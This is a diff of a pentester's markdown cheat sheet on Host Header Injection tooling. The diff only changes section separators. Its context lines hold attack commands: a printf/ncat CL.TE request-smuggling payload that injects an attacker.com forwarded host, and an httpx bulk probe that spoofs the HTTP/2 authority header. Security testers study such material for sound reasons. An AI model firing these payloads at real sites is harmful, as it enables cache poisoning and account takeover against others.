@@ -17,7 +17,7 @@ linked:
 ---
 # Host Header Injection - Tooling
 
-***
+---
 
 ## Burp Param Miner
 
@@ -32,7 +32,7 @@ linked:
 | BApp Store → "Reflection" → install | Highlight reflected inputs en historial | Pre-detection survey. |
 ^hhi-tool-paramminer
 
-___
+---
 
 ## Custom curl Scripts
 
@@ -71,7 +71,7 @@ done
 ./interactsh-client -v   # watch callbacks
 ```
 
-___
+---
 
 ## Wordlists
 
@@ -86,7 +86,7 @@ ___
 | `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cloud/AWS%20-%20Metadata.md` | Cloud metadata IPs reference | SSRF chain. |
 ^hhi-tool-wordlists
 
-___
+---
 
 ## HTTP Smuggler Combo (HRS Extension)
 
@@ -100,7 +100,7 @@ ___
 | `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: attacker.com\r\n\r\n' \| ncat target 80` | Manual CL.TE smuggling con HHI inject | Sin Burp. |
 ^hhi-tool-smuggler
 
-___
+---
 
 ## Otros Tools y Scripts
 
@@ -115,4 +115,4 @@ ___
 | `httpx --http2 -l hosts.txt -path /forgot -H ':authority: attacker'` | HTTP/2 :authority bulk | H2 testing. |
 ^hhi-tool-others
 
-***
+---
